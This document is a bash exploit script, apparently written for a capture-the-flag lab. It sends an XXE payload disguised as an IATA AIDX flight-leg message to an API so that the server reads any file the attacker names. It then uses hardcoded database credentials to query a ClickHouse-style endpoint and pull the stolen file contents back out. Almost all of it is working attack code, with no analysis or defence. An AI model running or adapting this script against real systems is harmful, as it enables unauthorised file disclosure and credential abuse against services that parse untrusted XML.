#!/usr/bin/env bash
# Usage: ./xxe.sh /path/to/target/file
# Fires the XXE at api, then reads back the row tagged with this run's marker.

set -euo pipefail

# --- config: adjust to your target ---
API_URL="http://10.129.176.64:8081/feeds/aidx"   # <-- set the real POST path
CH_BASE="http://db.htb-airport.htb/"
CH_AUTH="user=svc_events&password=Yl4aCgh4y2PnU"
# --------------------------------------

FILE="${1:?usage: $0 /path/to/target/file}"

# Unique all-numeric marker (looks like a flight number) so we read back exactly
# our row, not a racing one. 7 digits, e.g. 6742000-style.
MARK="674$(printf '%04d' $((RANDOM % 10000)))"

PAYLOAD=$(cat <<EOF
<?xml version="1.0"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
<!ENTITY xxe SYSTEM "file://${FILE}">
]>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator CompanyShortName="DC" />
  <FlightLeg>
    <LegIdentifier>
      <Airline CodeContext="3">&xxe;</Airline>
      <FlightNumber>${MARK}</FlightNumber>
      <DepartureAirport CodeContext="3">HOM</DepartureAirport>
      <ArrivalAirport CodeContext="3">LIN</ArrivalAirport>
      <OriginDate>2026-10-14</OriginDate>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
EOF
)

echo "[*] Target : ${FILE}"
echo "[*] Marker : ${MARK}"
curl -s -X POST "${API_URL}" \
  -H 'Content-Type: application/xml' \
  --data-binary "${PAYLOAD}" > /dev/null

# Poll for ingestion. Detect the row by COUNTING it (never empty even if the
# airline column itself is blank), then pull the content. %27=' %3D== += space.
echo "[*] Waiting for ingest..."
CNTQ="SELECT+count()+FROM+partner_feed.flightleg_json+WHERE+flight_number+%3D+%27${MARK}%27+FORMAT+TabSeparatedRaw"
for i in $(seq 1 10); do
  CNT=$(curl -s "${CH_BASE}?${CH_AUTH}&query=${CNTQ}")
  if [ "${CNT}" != "0" ] && [ -n "${CNT}" ]; then
    break
  fi
  sleep 0.5
done

if [ "${CNT:-0}" = "0" ] || [ -z "${CNT:-}" ]; then
  echo "[-] No row after 5s. Check: API_URL correct? File exists / readable?"
  exit 1
fi

# Row exists. Grab the exfiltrated file from `airline`; if blank, fall back to the
# full `event` JSON (the entity value is in there regardless).
AQ="SELECT+airline+FROM+partner_feed.flightleg_json+WHERE+flight_number+%3D+%27${MARK}%27+ORDER+BY+ingested+DESC+LIMIT+1+FORMAT+TabSeparatedRaw"
OUT=$(curl -s "${CH_BASE}?${CH_AUTH}&query=${AQ}")

echo "[+] File contents (${FILE}):"
echo "----------------------------------------"
if [ -n "${OUT}" ]; then
  printf '%s\n' "${OUT}"
else
  echo "(airline column empty — full event JSON below)"
  EQ="SELECT+event+FROM+partner_feed.flightleg_json+WHERE+flight_number+%3D+%27${MARK}%27+ORDER+BY+ingested+DESC+LIMIT+1+FORMAT+TabSeparatedRaw"
  curl -s "${CH_BASE}?${CH_AUTH}&query=${EQ}"
fi
echo "----------------------------------------"
exit 0
